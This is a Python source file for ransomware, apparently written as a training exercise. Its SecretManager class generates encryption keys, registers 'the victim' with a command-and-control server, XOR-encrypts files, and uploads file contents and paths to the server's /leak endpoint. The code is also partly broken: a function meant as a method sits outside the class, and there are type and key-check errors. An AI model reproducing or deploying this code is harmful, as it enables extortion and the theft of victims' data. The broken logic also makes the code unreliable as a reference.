from hashlib import sha256
import logging
import os
import secrets
from typing import List, Tuple
import os.path
import requests
import base64

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

from xorcrypt import xorfile

class SecretManager:
    ITERATION = 48000
    TOKEN_LENGTH = 16
    SALT_LENGTH = 16
    KEY_LENGTH = 16

    def __init__(self, remote_host_port:str="127.0.0.1:6666", path:str="/root") -> None:
        self._remote_host_port = remote_host_port
        self._path = path
        self._key = None
        self._salt = None
        self._token = None

        self._log = logging.getLogger(self.__class__.__name__)

    def do_derivation(self, salt:bytes, key:bytes)->bytes:
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=self.KEY_LENGTH,
            salt=salt,
            iterations=self.ITERATION,
            
        )
        return kdf.derive(key)


    def create(self)->Tuple[bytes, bytes, bytes]:
        self._salt = os.urandom(self.SALT_LENGTH)
        self._key = secrets.token_bytes(self.KEY_LENGTH)
        self._token = os.urandom(self.TOKEN_LENGTH)
        return self._salt, self._key, self._token


    def bin_to_b64(self, data:bytes)->str:
        tmp = base64.b64encode(data)
        return str(tmp, "utf8")

    def post_new(self, salt:bytes, key:bytes, token:bytes)->None:
        # register the victim to the CNC
        data = {
            "salt": self.bin_to_b64(salt),
            "key": self.bin_to_b64(key),
            "token": self.bin_to_b64(token),
        }
        requests.post(f"http://{self._remote_host_port}/register", json=data)

    def setup(self)->None:
        # main function to create crypto data and register malware to cnc
        self.create()
        self.post_new(self._salt, self._key, self._token)

    def load(self)->None:
        # function to load crypto data
        if os.path.exists(os.path.join(self._path, "secret.txt")):
            with open(os.path.join(self._path, "secret.txt"), "rb") as f:
                data = f.read().split(b"\n")
                if len(data) == 3:
                    self._salt = base64.b64decode(data[0])
                    self._key = base64.b64decode(data[1])
                    self._token = base64.b64decode(data[2])
                    return
        self.setup()
        with open(os.path.join(self._path, "secret.txt"), "wb") as f:
            f.write(self.bin_to_b64(self._salt) + b"\n")
            f.write(self.bin_to_b64(self._key) + b"\n")
            f.write(self.bin_to_b64(self._token) + b"\n")

    def check_key(self, candidate_key:bytes)->bool:
        # Assert the key is valid
        return sha256(candidate_key).digest() == self._key

    def set_key(self, b64_key:str)->None:
        # If the key is valid, set the self._key var for decrypting
        candidate_key = base64.b64decode(b64_key)
        if self.check_key(candidate_key):
            self._key = candidate_key

    def get_hex_token(self)->str:
        # Should return a string composed of hex symbole, regarding the token
        return self.bin_to_b64(self._token)

    def xorfiles(self, files:List[str])->None:
        # xor a list for file
        for file_path in files:
            try:
                xorfile(file_path, self._key)
            except Exception as e:
                self._log.error(f"Error encrypting file {file_path}: {e}")

    def leak_files(self, files:List[str])->None:
        # send file, geniune path and token to the CNC
        url = f"http://{self._remote_host_port}/leak"
        for file in files:
            with open(file, "rb") as f:
                content = f.read()
            b64_content = self.bin_to_b64(content)
            data = {
                "token": self.bin_to_b64(self._token),
                "path": file,
                "content": b64_content
            }
            response = requests.post(url, json=data)
            response.raise_for_status()
            
def clean(self) -> None:
        # Remove the local cryptographic files
        salt_file = os.path.join(self._path, "salt.bin")
        token_file = os.path.join(self._path, "token.bin")

        try:
            if os.path.exists(salt_file):
                os.remove(salt_file)
                self._log.info("file Salt removed")

            if os.path.exists(token_file):
                os.remove(token_file)
                self._log.info("file Token removed")

        except Exception as err:
            self._log.error(f"Error cleaning local cryptographic files: {err}")
            raise
        self._salt = None
        self._key = None
        self._token = None
        